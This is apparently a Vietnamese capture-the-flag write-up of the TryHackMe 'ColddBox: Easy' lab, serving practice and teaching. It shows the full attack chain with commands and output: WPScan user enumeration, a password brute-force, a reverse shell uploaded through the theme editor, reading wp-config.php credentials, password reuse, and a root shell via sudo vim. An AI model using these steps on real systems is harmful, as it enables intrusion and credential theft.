---
layout: post
author: "Neo"
title: "Tryhackme - ColddBox: Easy"
date: "2021-12-31"
tags: [
    "tryhackme",
    "web",
    "linux",
    "wordpress",
    "mysql",
    "ssh",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2021-12-31-THM-ColddBox-Easy/1.png)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - ColddBox: Easy](https://tryhackme.com/room/colddboxeasy)

## Reconnaissance

Như thông thường, việc đầu tiên cần làm quét các cổng đang mở trên máy chủ mục tiêu.

```python
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4512/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Đi qua web trước. Web được build bởi Wordpress 4.1.31, thử tìm xem có exploit nào với phiên bản này không

```python
┌──(neo㉿kali)-[~]
└─$ searchsploit wordpress 4.1.31
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Core < 4.7.1 - Username Enumeration                                                                                                              | php/webapps/41497.php
WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                                       | linux/webapps/41963.txt
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                                           | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                    | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                    | php/dos/47800.py
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                                | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                        | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities                                                                                       | php/webapps/38176.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                  | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                | php/webapps/48918.sh
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                                            | php/webapps/44595.rb
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass                                                                                                | php/webapps/43117.txt
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation                                                                                 | php/webapps/46083.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Có 1 exploit RCE với Metaploit, tôi sẽ thử với nó trước. Nhưng nó đòi hỏi phải có username và password nên tạm thời tôi sẽ để note nó lại.

Quay lại với tool thần thánh WPScan

```python
┌──(neo㉿kali)-[~]
└─$ wpscan --url http://10.10.229.157 -e vp,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.229.157/ [10.10.229.157]
[+] Started: Thu Aug 25 03:04:55 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.229.157/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.229.157/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.229.157/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.229.157/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.229.157/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.229.157/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.10.229.157/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://10.10.229.157/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.229.157/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

Ở đây tôi có được vài thứ hay ho 

- File *xmlrpc.php* có thể khai thác
- Theme đang sử dụng là twentyfifteen với phiên bản cũ
- Tìm được 4 username để có thể brute-force

Tôi sẽ thử phương pháp đơn giản nhất trước tiên, đó là brute-force username

```python
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:38 <==============================================================================================================> (137 / 137) 100.00% Time: 00:00:38

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                                                                                               
Trying c0ldd / pink123 Time: 00:02:10 <==                                                                                                              > (1225 / 43885)  2.79%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0ldd, Password: ************
```

Thử đăng nhập vào Wordpress và tôi nhận ra đây là user admin. Vào plugin editor để thử upload reverse shell

![upload-shell](/assets/img/2021-12-31-THM-ColddBox-Easy/2.png)

## RCE

Sau khi "Update File" thì tạo listener với port 9001. Truy cập vào *404.php* để lấy RCE:

`http://10.10.229.157/wp-content/themes/twentyfifteen/404.php`

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.229.157] 47378
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:33:17 up 49 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1341): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ColddBox-Easy:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ColddBox-Easy:/$ 
```

Với 1 machine có Wordpress, sau khi có RCE tôi thường truy vào xem nội dung *wp-config.php* vì thường nó sẽ chứa username và password của database.

```python
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php 
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', '**************');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

Thường thì trong các machine trước tôi thấy password database cũng sẽ là password của user đó, nên tôi cũng sẽ thử password này với user *c0ldd*

```python
www-data@ColddBox-Easy:/$ su c0ldd
Password: 
c0ldd@ColddBox-Easy:/$ id
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
c0ldd@ColddBox-Easy:/$ cd /home/c0ldd
c0ldd@ColddBox-Easy:~$ ls
user.txt
c0ldd@ColddBox-Easy:~$ 
```

Thật là 1 sự thần kỳ :smirk: Tôi tìm được *user flag*. 

## Privilege escalation

`sudo -l`

```python
c0ldd@ColddBox-Easy:~$ sudo -l
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:~$ 
```

Vào [GTFOBins](https://gtfobins.github.io) để tìm leo thang đặc quyền với `vim`

![vim-gtfobins](/assets/img/2021-12-31-THM-ColddBox-Easy/3.png)

Thử với command đầu tiên

```python
c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'

# ^[[2;2R
/bin/sh: 1: not found
/bin/sh: 1: 2R: not found
# id
uid=0(root) gid=0(root) grupos=0(root)
#
```

Hoàn thành! Một machine không quá khó, phù hợp để bắt đầu cho người mới.